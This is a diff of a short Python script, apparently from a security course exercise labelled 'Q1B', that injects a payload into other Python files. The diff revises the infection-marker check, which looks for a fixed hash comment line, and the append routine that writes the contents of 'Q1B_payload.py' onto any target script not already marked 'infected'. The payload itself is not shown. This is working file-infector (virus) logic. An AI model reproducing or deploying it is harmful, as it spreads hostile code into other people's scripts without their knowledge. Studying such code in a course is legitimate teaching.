@@ -1,15 +1,12 @@
 import sys
 
-def is_infected(file):
-    out_path = "/Q1B.out"
-    try:
-        with open(out_path, "r") as file:
-            for row in file:
-                if row == f"{file}\n":
-                    return True     
-        return False
-    except:
-        return False
+def is_infected(target_file):
+    id = "# 56858c6a52df13e2ae9f3a7cd02bc623c4b42d3670960249a6d50ebe4c5b9d7d"
+    with open(target_file, "r") as target:
+        for row in target:
+            if row.strip() == id:
+                return True     
+    return False
     
 def is_script(file):
     required_statement = 'if __name__ == "__main__":'
@@ -25,24 +22,23 @@ def verify(target_file):
     if not is_script(target_file):
         print("Could not verify file is python script; no {required_statement} statement.")
         return 0
-    if is_infected(target_file):
-        print("File is already infected.")
-        return 0
+    try:
+        if is_infected(target_file):
+            print("File is already infected.")
+            return 0
+    except: 
+        return 1 
 
     return 1
 
 def inject(target_file, payload_file):
-    try: 
-        with open(target_file, "a") as target_file, open(payload_file, "r") as payload_file:
-            target_file.write(payload_file.read())
-            return 0
-    except:
-        print(f"An error occured injecting {paylaod_file}.")
-        return 1
+    with open(target_file, "a+") as target:
+        target.write("\n")
+        with open(payload_file, "r") as payload:
+            target.write(payload.read())  
 
-
-
-
+              
+    
 
 def main():
     if len(sys.argv) != 2:
@@ -57,9 +53,9 @@ def main():
         return 1
 
 
-    payload_file = "/Q1B_payload.py"
-    inject = inject(target_file, payload_file)
-    if inject == 1: return 1
+    payload_file = "Q1B_payload.py"
+    inject(target_file, payload_file)
+    
 
     return 0
     
